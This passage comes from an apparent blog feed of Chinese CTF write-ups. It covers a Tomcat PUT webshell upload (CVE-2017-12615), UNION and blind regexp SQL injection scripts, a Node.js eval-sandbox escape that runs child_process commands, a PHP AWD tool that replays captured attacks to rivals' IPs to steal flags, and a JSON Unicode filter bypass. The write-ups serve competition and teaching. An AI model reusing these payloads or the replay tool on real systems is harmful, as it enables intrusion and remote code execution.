&gt;o\ \\
&gt;ech\\
sh _
sh y</code></pre><p><img src="https://cdn.redmango.top/img/20200630151900.png" alt></p>
<p>flag为上一级的key文件。</p>
<p>flag{a1c8BFF2}</p>
<h2 id="小猫咪踩灯泡"><a href="#小猫咪踩灯泡" class="headerlink" title="小猫咪踩灯泡"></a>小猫咪踩灯泡</h2><p>送分题，CVE-2017-12615</p>
<p>抓个包，get改成put，路径改成一个不存在的jsp文件，后面加上斜杠就能把马儿传上去了。</p>
<p><img src="https://cdn.redmango.top/img/20200630153429.png" alt></p>
<p>传上去发现根目录有个flag.txt</p>
<pre><code>http://06d6e62b.yunyansec.com/hhhm.jsp?&amp;pwd=023&amp;cmd=cat%20flag.txt</code></pre><p>flag{54e47be053bf6ea1}</p>
<h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><p>输入框输入</p>
<pre><code class="python">0&#39; union select 1,2,3,database()--
0&#39; union select 1,2,3,table_name from information_schema.tables where table_schema=&#39;web1&#39;#
0&#39; union select 1,2,3,column_name from information_schema.columns where table_name=&#39;fl4g&#39;#
0&#39; union select 1,2,3,flag from fl4g#</code></pre>
<h2 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h2><p>最后20分钟发现是regexp注入，哭了一直在跑一直在手抖,一边祈求者时间慢点。最后一分钟内吧flag提交成功。</p>
<ul>
<li>在一次又一次测试中发现居然存在password这个字段。立马想起了BJDCTF的REGEXP注入。过滤了空格直接用/**/代替。</li>
</ul>
<p><img src="C:%5CUsers%5C51763%5CDesktop%5Cpic%5C%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200630210453.png" alt="微信图片_20200630210453"></p>
<ul>
<li>最终exp</li>
</ul>
<pre><code class="php">import os
import requests as req

def ord2hex(string):
  result = &#39;&#39;
  for i in string:
    result += hex(ord(i))
  result = result.replace(&#39;0x&#39;,&#39;&#39;)
  return &#39;0x&#39;+result


string = [ord(i) for i in &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;]
headers = {
      &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0&#39;,
      &#39;Accept&#39;:&#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,
      &#39;Connection&#39;:&#39;keep-alive&#39;
    }

res = &#39;&#39;
for i in range(50):
  for j in string:
      url = &quot;http://a330e61e.yunyansec.com/picture.php?id=-1\&quot;or&quot;
      passwd = ord2hex(&#39;^&#39;+res+chr(j))
      passwd = &#39;/**/password/**/regexp/**/binary/**/{}-- &#39;.format(passwd)
      url = url+passwd
      #print(url)
      r = req.get(url, headers=headers)
      if &quot;PNG&quot; in r.text:
          res += chr(j)
          print(res)
          break</code></pre>
<p><img src="C:%5CUsers%5C51763%5CDesktop%5Cpic%5C%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200630211928.png" alt="微信截图_20200630211928"></p>
<ul>
<li>跑出密码,md5解密一下。</li>
</ul>
<pre><code>5832f4251cb6f43917df</code></pre><p><img src="C:%5CUsers%5C51763%5CDesktop%5Cpic%5C%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200630211248.png" alt="微信截图_20200630211248"></p>
<ul>
<li>登陆后台拿到flag</li>
</ul>
<p><img src="C:%5CUsers%5C51763%5CDesktop%5Cpic%5C%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200630211512.png" alt="微信截图_20200630211512"></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>NPUCTF2020 验证🐎-（弱类型比较、hash绕过、构造函数执行任意代码）</title>
    <url>//articles/d5efc80b37.html</url>
    <content><![CDATA[<ul>
<li>我们用一段代码来看再JavaScript中的类型比较：</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/20200424150332.png" alt="20200424150332"></p>
<ul>
<li><p>可以看到数组<code>[1]==1</code>在两个等于号时候是返回true的，而在三个等于号时候会返回false。这一点是和php一样的。</p>
</li>
<li><p>而在JavaScript中各个数据类型的相加呢？</p>
</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/20200424162607.png" alt="20200424162607"></p>
<p>可以看到对象和字符串相加最后得到的是字符串。而数组和字符串相加最后也是得到字符串。所以可以基本得出结论就是，<strong>node中任何数据类型和字符串相加最后得到的都是字符串</strong>。</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200424180609.png" alt="20200424180609"></p>
<p>而长度<code>length</code> 属性对于字符串是返回字符串长度，而数组是返回数组元素个数。而数字是没有<code>length</code> 的。</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200424215524.png" alt="20200424215524"></p>
<h2 id="NPUCTF2020-验证🐎"><a href="#NPUCTF2020-验证🐎" class="headerlink" title="[NPUCTF2020]验证🐎"></a>[NPUCTF2020]验证🐎</h2><pre><code class="javascript">app.post(&#39;/&#39;, function (req, res) {
  let result = &#39;&#39;;
  const results = req.session.results || [];
  const { e, first, second } = req.body;
  if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])) {
    if (req.body.e) {
      try {
        result = saferEval(req.body.e) || &#39;Wrong Wrong Wrong!!!&#39;;
      } catch (e) {
        console.log(e);
        result = &#39;Wrong Wrong Wrong!!!&#39;;
      }
      results.unshift(`${req.body.e}=${result}`);
    }
  } else {
    results.unshift(&#39;Not verified!&#39;);
  }
  if (results.length &gt; 13) {
    results.pop();
  }
  req.session.results = results;
  res.send(render(req.session.results));
});</code></pre>
<p>以这道题为例:</p>
<h3 id="hash绕过"><a href="#hash绕过" class="headerlink" title="hash绕过"></a>hash绕过</h3><p>要满足<code>first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])</code> 结合上面的结论我们我们想要<code>first</code> 和<code>second</code> 长度一样而他们内容又不相等，但是他们md5加盐后的值又要相等。可以构造如下payload：</p>
<pre><code>{&quot;e&quot;:paylod,&quot;first&quot;:[0],&quot;second&quot;:&quot;0&quot;}</code></pre><p>这是因为数组利用了<strong>任何数据类型加上字符串都会转变称为字符串的特性</strong>。同时数组和字符串的长度都是1但是他们却不全等。</p>
<pre><code class="python">import requests
import json
headers = {
    &quot;Content-Type&quot;:&quot;application/json&quot;
}
url = &quot;http://ff8efecb-b1bc-4df1-af3d-249b285a0c54.node3.buuoj.cn/&quot;
data = {&quot;e&quot;:&#39;paylod&#39;,&quot;first&quot;:[0],&quot;second&quot;:&quot;0&quot;}
r = requests.post(url,data=json.dumps(data),headers=headers)
print(r.text)</code></pre>
<p>这道题的第二关我一直没做出来,虽然看正则就知道是用math去RCE。</p>
<h3 id="构造函数执行任意代码"><a href="#构造函数执行任意代码" class="headerlink" title="构造函数执行任意代码"></a>构造函数执行任意代码</h3><p>题目关键代码：</p>
<pre><code class="javascript">function saferEval(str) {
  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, &#39;&#39;)) {
    return null;
  }
  return eval(str);
}</code></pre>
<p>从正则可以看出只能嵌套Math而且Math只能用一个点，也就是只能用一层属性。</p>
<p>我们再来看最终的payload:</p>
<pre><code class="javascript">(Math=&gt;(
    Math=Math.constructor,
    Math.x=Math.constructor(
        Math.fromCharCode(
114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41)
        )()))(Math+1)</code></pre>
<p><code>Math=&gt;</code> 是什么意思？我们来看个简单的例子：</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200424231655.png" alt="20200424231655"></p>
<p>可以发现最终是生成了个函数。是的这就是我们熟悉的匿名函数。<code>x =&gt; x * x</code> 相当于：</p>
<pre><code class="javascript">function (x) {
    return x * x;
}</code></pre>
<p>同理<code>a = x=&gt;x*x</code> 相当于命名了一个名字为a的函数：</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200424231946.png" alt="20200424231946"></p>
<p>那么<code>(x=&gt;x+x)(2)</code>呢其实就相当于往这个函数里面传入参数2：</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200424235002.png" alt="20200424235002"></p>
<p>我们再回到payload本身<code>(Math=Math.constructor,Math.x=Math.constructor(......))</code> 可以清楚地看到最外层括号是一个逗号运算，而逗号运算我们知道是从左往右运算再最后返回最右边的值。我们由此得知这里是执行这么个运算：</p>
<pre><code class="javascript">Math.constructor.constructor(.....)</code></pre>
<p>而这又是什么呢，我们直接逐层测试的<code>Math.constructor</code> ：</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200425002236.png" alt="20200425002236"></p>
<p>可以见到第一层返回的<code>function object()</code>,他是function的对象原型，而我们知道Object的构造器是指向Function的所以第二层会出现Function。而Function是构造函数他能够创建函数。可以简单理解他和eval类似。我们可以测试一个例子：</p>
<pre><code class="javascript">var sum = Math.constructor.constructor(&#39;a&#39;, &#39;b&#39;, &#39;return a + b&#39;);
sum(1,2);
var fun = new Function(&#39;a&#39;, &#39;b&#39;, &#39;return a + b&#39;);
fun(1,2)</code></pre>
<p><img src="http://goodcheerleung.gitee.io/blog/20200425003241.png" alt="20200425003241"></p>
<p>可以直接看到结果，<code>Math.constructor.constructor()</code> 和构造函数<code>new Function()</code> 是等效的。当然这个不知在Math中其他任意函数应该也是类似的。例如：alert()</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200425003702.png" alt="20200425003702"></p>
<p>而payload的最里面<code>fromCharCode</code>就很容易理解了就是把AIISC码转换为字符串,那么生成payload脚本如下：</p>
<pre><code class="python">import re
encode = lambda code: list(map(ord,code))
decode = lambda code: &quot;&quot;.join(map(chr,code))
a=f&quot;&quot;&quot;
(m0=&gt;(
        m0=m0.constructor,
        m0.x=m0.constructor(
            m0.fromCharCode({encode(&quot;return process.mainModule.require(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;)&quot;)})
        )()
    ))(Math+1)
&quot;&quot;&quot;
a=re.sub(r&quot;[\s\[\]]&quot;, &quot;&quot;, a).replace(&quot;m0&quot;,&quot;Math&quot;)
print(a)
</code></pre>
<h3 id="最终EXP"><a href="#最终EXP" class="headerlink" title="最终EXP"></a>最终EXP</h3><pre><code class="python">import requests
import json
headers = {
    &quot;Content-Type&quot;:&quot;application/json&quot;
}
url = &quot;http://14b5ae3b-e444-4e5b-9e2b-1ba3100fc085.node3.buuoj.cn/&quot;
data = {&quot;e&quot;:&#39;(Math=&gt;(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)&#39;,&quot;first&quot;:[0],&quot;second&quot;:&quot;0&quot;}
r = requests.post(url,data=json.dumps(data),headers=headers)
print(r.text)</code></pre>
<p>GETFLAG:</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200425004237.png" alt="20200425004237"></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-AWD线下赛劫持流量和流量转发WAF的开发</title>
    <url>//articles/d5f6518399.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    没参加过CTF线下赛，用别人的waf又不了解其他人写的WAF的代码，万一出了问题也不好解决。因此昨晚连夜写了个WAF。WAF参考了360WAF的正则，对网站流量劫持并转发，cookie流量转发尚未完成。主要是使用了file_get_contents()发送POST和GET流量。如果使用注入等语句，将会对其进行拦截，本项目会劫持所有流量并以json的形式储存在waflog文件夹下(默认)，项目初始化会读取waflog下的ip.txt的ip写入数组，对劫持到的所有流量原样转发至该数组下的所有ip，如果存在flag{}(根据比赛修改flag的样式)将会保存至flag.txt</p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ul>
<li>两个服务器存在相同的靶机，分别是120.<em>.\</em>.*和本地127.0.0.1</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190914/1568447577771.png" alt="img"></p>
<ul>
<li>本地挂上WAF</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190914/15684475369688.png" alt="img"></p>
<ul>
<li>将远程的靶机添加到<code>waflog\ip.txt</code>，然后对本地靶机进行攻击。发现流量和flag存储在<code>waflog</code>文件夹下。当然也就可以自动提交flag根据不同比赛的发送流量。</li>
<li>本地flag是<code>flag{abc}</code>而远程的flag是<code>flag{I_wan_to_have_a_girlfriend}</code></li>
<li>发现flag.txt下保存了远程的flag</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190914/15684478947549.png" alt="img"></p>
<h2 id="成品代码"><a href="#成品代码" class="headerlink" title="成品代码"></a>成品代码</h2><pre><code class="php">&lt;?php
error_reporting(0);
class CTF_WAF{
    public $getfilter;
    public $postfilter;
    public $cookiefilter;
    public $url;
    public $dir;
    public $ip;
    public function __construct() {
         $this-&gt;getfilter = &quot;\\&lt;.+javascript:window\\[.{1}\\\\x|&lt;.*=(&amp;#\\d+?;?)+?&gt;|&lt;.*(data|src)=data:text\\/html.*&gt;|\\b(alert\\(|confirm\\(|expression\\(|prompt\\(|benchmark\s*?\(.*\)|sleep\s*?\(.*\)|\\b(group_)?concat[\\s\\/\\*]*?\\([^\\)]+?\\)|\bcase[\s\/\*]*?when[\s\/\*]*?\([^\)]+?\)|load_file\s*?\\()|&lt;[a-z]+?\\b[^&gt;]*?\\bon([a-z]{4,})\s*?=|^\\+\\/v(8|9)|\\b(and|or)\\b\\s*?([\\(\\)&#39;\&quot;\\d]+?=[\\(\\)&#39;\&quot;\\d]+?|[\\(\\)&#39;\&quot;a-zA-Z]+?=[\\(\\)&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\/\\*.*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;)\s*)|UPDATE\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;)\s*)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)@{0,2}(\\(.+\\)|\\s+?.+?\\s+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;))FROM(\\(.+\\)|\\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;))|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)|&lt;.*(iframe|frame|style|embed|object|frameset|meta|xml|a|img)|hacker&quot;;
        //post拦截规则
        $this-&gt;postfilter = &quot;&lt;.*=(&amp;#\\d+?;?)+?&gt;|&lt;.*data=data:text\\/html.*&gt;|\\b(alert\\(|confirm\\(|expression\\(|prompt\\(|benchmark\s*?\(.*\)|sleep\s*?\(.*\)|\\b(group_)?concat[\\s\\/\\*]*?\\([^\\)]+?\\)|\bcase[\s\/\*]*?when[\s\/\*]*?\([^\)]+?\)|load_file\s*?\\()|&lt;[^&gt;]*?\\b(onerror|onmousemove|onload|onclick|onmouseover)\\b|\\b(and|or)\\b\\s*?([\\(\\)&#39;\&quot;\\d]+?=[\\(\\)&#39;\&quot;\\d]+?|[\\(\\)&#39;\&quot;a-zA-Z]+?=[\\(\\)&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\/\\*.*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;)\s*)|UPDATE\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;)\s*)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)(\\(.+\\)|\\s+?.+?\\s+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;))FROM(\\(.+\\)|\\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;))|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)|&lt;.*(iframe|frame|style|embed|object|frameset|meta|xml|a|img)|hacker&quot;;
        //cookie拦截规则
        $this-&gt;cookiefilter = &quot;benchmark\s*?\(.*\)|sleep\s*?\(.*\)|load_file\s*?\\(|\\b(and|or)\\b\\s*?([\\(\\)&#39;\&quot;\\d]+?=[\\(\\)&#39;\&quot;\\d]+?|[\\(\\)&#39;\&quot;a-zA-Z]+?=[\\(\\)&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\/\\*.*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;)\s*)|UPDATE\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;)\s*)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)@{0,2}(\\(.+\\)|\\s+?.+?\\s+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;))FROM(\\(.+\\)|\\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;))|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;
        $this-&gt;url = &#39;http://&#39;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;REQUEST_URI&#39;];
        $this-&gt;dir = __DIR__.&#39;\\&#39;.&#39;waflog\\&#39;;
        $this-&gt;ip = [];
        $this-&gt;read_ip();

    }

    public function Flux($Value,$style){
                switch ($style) {
                    case &#39;post&#39;:
                        $this-&gt;Check_Flux($Value, $this-&gt;postfilter);
                        if(is_array($Value)){
                            $Value = http_build_query($Value);
                        }

                        $this-&gt;data_to_file(&quot;{\&quot;&quot;.$this-&gt;url.&quot;\&quot;:&quot;.&quot;\&quot;&quot;.$Value.&quot;\&quot;}&quot;,&quot;post.txt&quot;,&#39;post&#39;);
                        break;
                    case &#39;get&#39;:
                        $this-&gt;Check_Flux($Value, $this-&gt;getfilter);
                        if(is_array($Value)){
                            $Value = implode($Value);
                        }
                        $this-&gt;data_to_file($this-&gt;url.&quot;\r\n&quot;,&quot;get.txt&quot;,&#39;get&#39;);
                        break;
                    default:
                        $this-&gt;Check_Flux($Value, $this-&gt;cookiefilter);
                        if(is_array($Value)){
                            $Value = http_build_query($Value);
                        }

                        $this-&gt;data_to_file(&quot;{\&quot;&quot;.$this-&gt;url.&quot;\&quot;:&quot;.&quot;\&quot;&quot;.$Value.&quot;\&quot;}&quot;,&quot;cookie.txt&quot;,&#39;cookie&#39;);
                        break;
                }            
            }
    public function read_ip(){
        $file = fopen($this-&gt;dir.&quot;ip.txt&quot;, &quot;r&quot;) or exit(&quot;Unable to open file!&quot;);
        while(!feof($file))
        {
         array_push($this-&gt;ip, fgets($file));
        }
        fclose($file);
    }    

    public function Check_Flux($Value,$ArrFiltReq){
            if(is_array($Value)){
            $Value=implode($Value);
            }
            if (preg_match(&quot;/&quot;.$ArrFiltReq.&quot;/is&quot;,$Value)==1){
            die();
            }
        }

    public function Request_Post($data,$url){
        if(is_array($data)){
                $query = http_build_query($data); //使用给出的关联（或下标）数组生成一个经过 URL-encode 的请求字符串。
            }else{
                $query = $data;
            }
        $options[&#39;http&#39;] = array(
         &#39;timeout&#39;=&gt;60,
         &#39;method&#39; =&gt; &#39;POST&#39;,
         &#39;header&#39; =&gt; &#39;Content-type:application/x-www-form-urlencoded&#39;,
         &#39;content&#39; =&gt; $query
        );//构造一个post包

        $context = stream_context_create($options);//创建并返回一个资源流上下文
        $result = file_get_contents($url, false, $context);
        return $result; 
    }

    public function Request_Get($url){
        $result = file_get_contents($url);
         //var_dump($result);
        return $result; 
    }

    public function Get_Flag($result){
        if(stristr($result,&#39;flag&#39;)){
           preg_match_all(&#39;/flag{(.*?)}/&#39;, $result,$flag);
            $this-&gt;data_to_file($flag[0][0].&quot;\r\n&quot;,&quot;flag.txt&quot;,&#39;flag&#39;);
        }
    }

    public function data_to_file($data,$filename,$style=&#39;&#39;){
        if(is_array($data)){
            $data = implode($data);
        }
        switch ($style) {
            case &#39;post&#39;:
            //$jsonData = json_decode(&#39;[&#39;.file_get_contents(__DIR__.&#39;\\&#39;.$filename).&#39;]&#39;,true);
                if(!stristr(file_get_contents($this-&gt;dir.$filename),$data)){

                    if(file_exists($this-&gt;dir.$filename)){
                        file_put_contents($this-&gt;dir.$filename,&quot;,&quot;.$data,FILE_APPEND);    
                    }else{
                        file_put_contents($this-&gt;dir.$filename,$data,FILE_APPEND);
                    }
                    for($i=0;$i&lt;count($this-&gt;ip);$i++){
                        $this-&gt;Get_Flag($this-&gt;Request_Post(json_decode($data,true)[$this-&gt;url],&#39;http://&#39;.$this-&gt;ip[$i].&#39;/&#39;));
                    }
                }
                //var_dump($jsonData);
                break;
            case &#39;get&#39;:
             $js_data = $data;
                if(!stristr(file_get_contents($this-&gt;dir.$filename),str_replace(&#39;http://&#39;.$_SERVER[&#39;HTTP_HOST&#39;], &#39;&#39;, $data))){
                    file_put_contents($this-&gt;dir.$filename, $js_data ,FILE_APPEND);
                    for($i=0;$i&lt;count($this-&gt;ip);$i++){
                    $this-&gt;Get_Flag($this-&gt;Request_Get(str_replace(&quot;\r\n&quot;,&quot;&quot;,str_replace($_SERVER[&#39;HTTP_HOST&#39;], $this-&gt;ip[$i], $data))));
                    }
                }
                break;
            case &#39;cookie&#39;:
                if(!stristr(file_get_contents($this-&gt;dir.$filename),$data)){
                    if(file_exists($this-&gt;dir.$filename)){
                        file_put_contents($this-&gt;dir.$filename,&quot;,&quot;.$data,FILE_APPEND);    
                    }else{
                        file_put_contents($this-&gt;dir.$filename,$data,FILE_APPEND);
                    }
                }
                break;
            case &#39;flag&#39;:
                if(!stristr(file_get_contents($this-&gt;dir.$filename),$data)){
                    file_put_contents($this-&gt;dir.$filename,$data,FILE_APPEND);
                }
                break;
        }
    }
}


/*******************************/
/*         调用WAF            */

$waf = new  CTF_WAF();

if(isset($_GET)){
    $waf-&gt;Flux($_GET,&#39;get&#39;);
}

if(isset($_POST)){
    $waf-&gt;Flux($_POST,&#39;post&#39;);
}

foreach($_COOKIE as $key=&gt;$value){
    $waf-&gt;Flux($value,&#39;cookie&#39;);

}</code></pre>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>西湖论剑Easyjson Write up</title>
    <url>//articles/d611bed02b.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>太菜了只做了一道</p>
</blockquote>
<h2 id="Easyjson"><a href="#Easyjson" class="headerlink" title="Easyjson"></a>Easyjson</h2><ul>
<li>代码审计</li>
</ul>
<pre><code class="php"> &lt;?php
include &#39;security.php&#39;;

if(!isset($_GET[&#39;source&#39;])){
    show_source(__FILE__);
    die();
}
$sandbox = &#39;sandbox/&#39;.sha1($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]).&#39;/&#39;;
var_dump($sandbox);
if(!file_exists($sandbox)){
    mkdir($sandbox);
    file_put_contents($sandbox.&quot;index.php&quot;,&quot;&lt;?php echo &#39;Welcome To Dbapp OSS.&#39;;?&gt;&quot;);
}
$action = $_GET[&#39;action&#39;];
$content = file_get_contents(&quot;php://input&quot;);


if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
    $content = json_decode($content);
    $filename = $_GET[&#39;filename&#39;];
    $filecontent = $content-&gt;content;
    $filename = $sandbox.$filename;
    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
}elseif($action == &quot;reset&quot;){
    $files = scandir($sandbox);
    foreach($files as $file) {
        if(!is_dir($file)){
            if($file !== &quot;index.php&quot;){
                unlink($sandbox.$file);
            }
        }
    }
}
else{
    die(&#39;Security Check Failed.&#39;);
}
</code></pre>
<ul>
<li>代码主要部分在,但是这里有一个waf对文件名和content参数进行过滤。简单Fuzz了一下，filename可以使用php后缀，说明可以写php文件，但是有一个很关键的问题就是<code>content</code>它传来必须是一个json,json中有一个属性是content，例如：<code>{&#39;content&#39;:&#39;&lt;?=phpinfo()?&gt;&#39;}</code>但是<code>waf</code>对json进行了过滤，不能存在content这个字符串(还过滤了其他关键字)。</li>
</ul>
<pre><code class="php">if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
    $content = json_decode($content);
    $filename = $_GET[&#39;filename&#39;];
    $filecontent = $content-&gt;content;
    $filename = $sandbox.$filename;
    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
}</code></pre>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001234@2x.png" alt="WX20201009-001234@2x"></p>
<ul>
<li>神小密圈发现，json支持的字符中可以支持unicode编码，那么我们全都用unicode编码来代替字符串不就行了？</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG59.jpeg" alt="WechatIMG59"></p>
<ul>
<li>简单测试一下发现可以.<a href="https://blog.csdn.net/weixin_30654419/article/details/97554779?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param" target="_blank" rel="noopener">Unicode表</a></li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG72.png" alt="WechatIMG72"></p>
<ul>
<li>简单写个脚本来将字符串转化为unicode编码。</li>
</ul>
<pre><code class="php">&lt;?php

function unicode_encode($str){
    $table = [
            &#39;\u002&#39;=&gt;[&#39; &#39;,&#39;!&#39;,&#39;&quot;&#39;,&#39;#&#39;,&#39;$&#39;,&#39;%&#39;,&#39;&amp;&#39;,&#39;\&#39;&#39;,&#39;(&#39;,&#39;)&#39;,&#39;*&#39;,&#39;+&#39;,&#39;,&#39;,&#39;-&#39;,&#39;.&#39;,&#39;/&#39;],
            &#39;\u003&#39;=&gt;[&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;:&#39;,&#39;;&#39;,&#39;&lt;&#39;,&#39;=&#39;,&#39;&gt;&#39;,&#39;?&#39;],
            &#39;\u004&#39;=&gt;[&#39;@&#39;,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;],
            &#39;\u005&#39;=&gt;[&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;[&#39;,&#39;\\&#39;,&#39;]&#39;,&#39;^&#39;,&#39;_&#39;],
            &#39;\u006&#39;=&gt;[&#39;`&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;],
            &#39;\u007&#39;=&gt;[&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;{&#39;,&#39;|&#39;,&#39;}&#39;,&#39;~&#39;]
];
    foreach ($table as $key =&gt; $value) {
        $i = 0;
        foreach ($value as $vcode) {
            $i=$i+1;
            if($str==$vcode){
                return $key.bin2e($i-1);
            }

        }
    }

}

function bin2e($str){
    switch ($str) {
        case &#39;10&#39;:
            return &#39;a&#39;;
            break;
        case &#39;11&#39;:
            return &#39;b&#39;;
            break;
        case &#39;12&#39;:
            return &#39;c&#39;;
            break;
        case &#39;13&#39;:
            return &#39;d&#39;;
            break;
        case &#39;14&#39;:
            return &#39;e&#39;;
            break;
        case &#39;15&#39;:
            return &#39;f&#39;;
            break;
        default:
            return $str;
            break;
    }
}

function main($str){
